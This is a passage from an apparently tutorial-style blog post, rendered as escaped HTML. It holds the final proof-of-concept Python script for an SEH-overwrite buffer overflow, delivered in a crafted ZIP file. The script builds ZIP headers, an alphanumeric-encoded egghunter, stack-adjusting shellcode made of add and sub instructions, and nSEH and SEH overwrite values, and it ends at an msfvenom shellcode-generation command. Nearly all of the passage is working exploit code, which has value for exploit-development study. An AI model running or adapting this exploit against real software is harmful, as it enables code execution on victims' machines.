</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb3</span>\<span class="n">x86</span>\<span class="n">x37</span>\<span class="n">x24</span>\<span class="n">xca</span>\<span class="n">x04</span>\<span class="n">xb2</span>\<span class="n">xd4</span>\<span class="n">x29</span>\<span class="n">x14</span>\<span class="n">xb7</span>\<span class="n">xd1</span>\<span class="n">x76</span>\<span class="n">x92</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2b</span>\<span class="n">xab</span>\<span class="n">xe7</span>\<span class="n">x77</span>\<span class="n">x4c</span>\<span class="n">x18</span>\<span class="n">x07</span>\<span class="n">x52</span>\<span class="n">x2f</span>\<span class="n">xff</span>\<span class="n">x9b</span>\<span class="n">x3e</span>\<span class="n">x9e</span>\<span class="n">x9a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x1b</span>\<span class="n">xa4</span>\<span class="n">xde</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>And the final PoC code covering everything discussed so far should look like this:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_1</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_2</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x24</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_3</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x12</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x02</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Building</span> <span class="n">PoC</span><span class="o">..&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">max_size</span> <span class="o">=</span> <span class="mi">4064</span>
</span><span class='line'><span class="n">nseh_offset</span> <span class="o">=</span> <span class="mi">292</span>
</span><span class='line'><span class="n">jump_offset</span> <span class="o">=</span> <span class="mi">92</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfencode</span> <span class="o">-</span><span class="n">e</span> <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span> <span class="n">bufferregister</span><span class="o">=</span><span class="n">eax</span> <span class="o">-</span><span class="n">i</span> <span class="n">egghunter</span><span class="o">-</span><span class="n">wow64</span><span class="o">.</span><span class="n">bin</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span> <span class="n">succeeded</span> <span class="k">with</span> <span class="n">size</span> <span class="mi">146</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">egghunter</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x59</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x37</span>\<span class="n">x51</span>\<span class="n">x5a</span>\<span class="n">x6a</span>\<span class="n">x41</span>\<span class="n">x58</span>\<span class="n">x50</span>\<span class="n">x30</span>\<span class="n">x41</span>\<span class="n">x30</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x6b</span>\<span class="n">x41</span>\<span class="n">x41</span>\<span class="n">x51</span>\<span class="n">x32</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x32</span>\<span class="n">x42</span>\<span class="n">x42</span>\<span class="n">x30</span>\<span class="n">x42</span>\<span class="n">x42</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x58</span>\<span class="n">x50</span>\<span class="n">x38</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x75</span>\<span class="n">x4a</span>\<span class="n">x49</span>\<span class="n">x66</span>\<span class="n">x51</span>\<span class="n">x49</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x52</span>\<span class="n">x73</span>\<span class="n">x53</span>\<span class="n">x63</span>\<span class="n">x62</span>\<span class="n">x73</span>\<span class="n">x36</span>\<span class="n">x33</span>\<span class="n">x4e</span>\<span class="n">x53</span>\<span class="n">x6f</span>\<span class="n">x30</span>\<span class="n">x75</span>\<span class="n">x36</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6d</span>\<span class="n">x51</span>\<span class="n">x59</span>\<span class="n">x5a</span>\<span class="n">x49</span>\<span class="n">x6f</span>\<span class="n">x36</span>\<span class="n">x6f</span>\<span class="n">x72</span>\<span class="n">x62</span>\<span class="n">x71</span>\<span class="n">x42</span>\<span class="n">x42</span>\<span class="n">x4a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x66</span>\<span class="n">x46</span>\<span class="n">x56</span>\<span class="n">x38</span>\<span class="n">x74</span>\<span class="n">x73</span>\<span class="n">x78</span>\<span class="n">x49</span>\<span class="n">x4c</span>\<span class="n">x4b</span>\<span class="n">x4b</span>\<span class="n">x64</span>\<span class="n">x61</span>\<span class="n">x74</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x6f</span>\<span class="n">x47</span>\<span class="n">x63</span>\<span class="n">x31</span>\<span class="n">x4e</span>\<span class="n">x50</span>\<span class="n">x5a</span>\<span class="n">x77</span>\<span class="n">x4c</span>\<span class="n">x77</span>\<span class="n">x75</span>\<span class="n">x53</span>\<span class="n">x44</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x79</span>\<span class="n">x38</span>\<span class="n">x38</span>\<span class="n">x52</span>\<span class="n">x57</span>\<span class="n">x36</span>\<span class="n">x50</span>\<span class="n">x50</span>\<span class="n">x30</span>\<span class="n">x33</span>\<span class="n">x44</span>\<span class="n">x6c</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x59</span>\<span class="n">x6a</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x32</span>\<span class="n">x55</span>\<span class="n">x38</span>\<span class="n">x64</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x70</span>\<span class="n">x75</span>\<span class="n">x6b</span>\<span class="n">x51</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6b</span>\<span class="n">x4f</span>\<span class="n">x79</span>\<span class="n">x77</span>\<span class="n">x41</span>\<span class="n">x41</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="n">egghunter</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="n">jump_offset</span><span class="p">)</span> <span class="c"># padding for nSEH&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x41</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># INC ECX (acts as NOPs, but with valid character set)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Offset</span> <span class="n">the</span> <span class="n">stack</span> <span class="n">by</span> <span class="mh">0x632</span> <span class="n">to</span> <span class="n">start</span> <span class="n">writing</span> <span class="n">to</span> <span class="n">a</span> <span class="n">controlled</span> <span class="n">area</span> <span class="n">of</span> <span class="n">memory</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x54</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push esp;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x58</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># pop eax;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x33</span>\<span class="n">x07</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x01010733</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2d</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># sub eax, 0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x5c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># pop esp;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Write</span> <span class="n">instructions</span> <span class="k">for</span><span class="p">:</span> <span class="n">push</span> <span class="n">esp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">eax</span><span class="p">;</span> <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">;</span> <span class="n">jmp</span> <span class="n">eax</span><span class="p">;</span> <span class="n">jmp</span> <span class="mh">0xee</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xeceb90e0 into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x70</span>\<span class="n">x77</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77777070</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x20</span>\<span class="n">x74</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77742070</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xff000000 into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x22</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x22101010</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2d</span>\<span class="n">x12</span>\<span class="n">x12</span>\<span class="n">x12</span>\<span class="n">x11</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># sub eax, 0x11121212</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xbe2d5854 into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x43</span>\<span class="n">x47</span>\<span class="n">x1c</span>\<span class="n">x67</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x671c4743</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x11</span>\<span class="n">x11</span>\<span class="n">x11</span>\<span class="n">x57</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x57111111</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>    <span class="c"># padding for the rest of encoder&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x71</span>\<span class="n">x9b</span>\<span class="n">x70</span>\<span class="n">x9b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>       <span class="c"># nSEH: jno $-99; jo $-99   =&gt; &amp;lsquo;9b&amp;rsquo; will actually be converted to &amp;lsquo;a2&amp;rsquo;, which is $-92</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x33</span>\<span class="n">x28</span>\<span class="n">x42</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>       <span class="c"># SEH&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">shellcode</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">w00tw00t</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                     <span class="c"># egg</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x81</span>\<span class="n">xe4</span>\<span class="n">xf0</span>\<span class="n">xff</span>\<span class="n">xff</span>\<span class="n">xff</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>    <span class="c"># align the stack: AND esp,0xFFFFFFF0&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="k">exec</span> <span class="n">CMD</span><span class="o">=</span><span class="n">calc</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">b</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x0a</span>\<span class="n">x0d</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
